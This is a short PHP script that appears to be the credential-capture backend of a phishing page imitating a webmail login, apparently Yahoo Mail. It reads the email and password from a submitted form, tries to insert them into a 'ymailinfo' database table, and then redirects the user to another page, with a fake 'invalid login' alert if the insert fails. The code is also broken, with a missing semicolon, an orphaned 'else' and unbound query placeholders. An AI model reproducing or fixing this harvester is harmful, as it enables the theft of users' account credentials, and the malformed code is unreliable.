<?php
$server = "localhost" ;
$username = "root" ;
$password = "" ;
$dbname = "ymaillog" ;


$conn = mysqli_connect($server , $username , $password , $dbname) ;
if(isset($_POST['submit'])){

    if(!empty($_POST['email']) &&  !empty($_POST['password'])){

        $email = $_POST['email'] ;
        $password = $_POST['password']

        if (mysqli_connect_error()) {
            else {
                $insert = "insert into ymailinfo (email,password) values ('?', '?') " ;
                $run = mysqli_query($conn,$insert) or die(mysqli_error());
                }
        }
         
       
        if($run){
            header("location:index-2.html");
        }
        else{
            echo '<script type="text/javascript">alert("Invalid email and password")</script>';
        }
    }
    else{
        echo "all fields are required" ;
    }

}


?>